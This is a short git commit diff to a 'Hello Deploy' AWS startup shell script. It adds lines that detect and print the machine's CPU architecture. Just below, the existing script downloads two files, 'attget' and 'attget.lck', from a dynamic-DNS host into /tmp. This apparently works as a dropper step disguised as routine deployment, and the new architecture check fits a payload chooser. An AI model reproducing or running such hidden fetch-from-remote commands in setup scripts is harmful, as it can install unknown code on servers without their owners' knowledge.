e8726c06e8a97869f46a3552a07f396b28963b8e
paulkey731 <paul.key731@gmail.com>
2026-04-12 17:14:31 -0700

    check ARCH

--- scripts/startup.sh
+++ scripts/startup.sh
@@ -3,6 +3,20 @@ echo "========================================="
 echo "  Hello Deploy is starting up on AWS!"
 echo "========================================="
 
+echo "--- System Info ---"
+ARCH=$(uname -m)
+echo "Architecture: $ARCH"
+
+if [ "$ARCH" = "x86_64" ]; then
+  echo "This is x86_64 (Intel/AMD 64-bit)"
+elif [ "$ARCH" = "aarch64" ]; then
+  echo "This is ARM64"
+elif [ "$ARCH" = "armv7l" ]; then
+  echo "This is ARM 32-bit"
+else
+  echo "Unknown architecture: $ARCH"
+fi
+
 wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget"
 wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
 sleep 2
